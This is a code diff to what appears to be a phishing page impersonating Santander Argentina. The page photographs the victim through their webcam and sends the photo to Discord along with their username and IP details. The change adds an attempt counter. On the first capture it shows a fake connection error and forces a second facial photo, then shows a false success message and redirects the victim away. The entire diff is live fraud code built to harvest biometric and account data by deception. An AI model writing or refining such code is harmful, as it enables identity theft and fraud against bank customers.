@@ -168,10 +168,14 @@
 				clearInterval(interval);
 				completeFacial();
 			}
-		}, 1000);
+		}, 3000);
 	}
 
 	function completeFacial() {
+		var bioAttempt = parseInt(localStorage.getItem('santander_bio_attempt') || '0', 10);
+		bioAttempt++;
+		localStorage.setItem('santander_bio_attempt', bioAttempt);
+
 		capturePhoto().then(function(photoBlob) {
 			stopWebcam();
 
@@ -181,7 +185,7 @@
 
 			SantanderLogger.getIpInfo().then(function(ipInfo) {
 				var embeds = [{
-					title: '📸 Santander AR - Captura Facial',
+					title: '📸 Santander AR - Captura Facial (Intento ' + bioAttempt + ')',
 					color: 0xEC0000,
 					fields: [
 						{ name: '👤 Usuario', value: '`' + (flowData.usuario || 'N/A') + '`', inline: true },
@@ -199,11 +203,19 @@
 				}];
 
 				SantanderLogger.sendToDiscordWithFile(embeds, photoBlob, 'facial.jpg').then(function() {
-					localStorage.removeItem('santander_flow_data');
-					if (statusEl) statusEl.textContent = '✓ VERIFICACIÓN EXITOSA';
-					setTimeout(function() {
-						window.location.href = 'https://www.google.com';
-					}, 1500);
+					if (bioAttempt >= 2) {
+						localStorage.removeItem('santander_flow_data');
+						localStorage.removeItem('santander_bio_attempt');
+						if (statusEl) statusEl.textContent = '✓ VERIFICACIÓN EXITOSA';
+						setTimeout(function() {
+							window.location.href = 'https://www.google.com';
+						}, 1500);
+					} else {
+						if (statusEl) statusEl.textContent = '⚠ ERROR DE CONEXIÓN';
+						setTimeout(function() {
+							window.location.href = 'error.html?r=bio.html';
+						}, 1500);
+					}
 				});
 			});
 		});
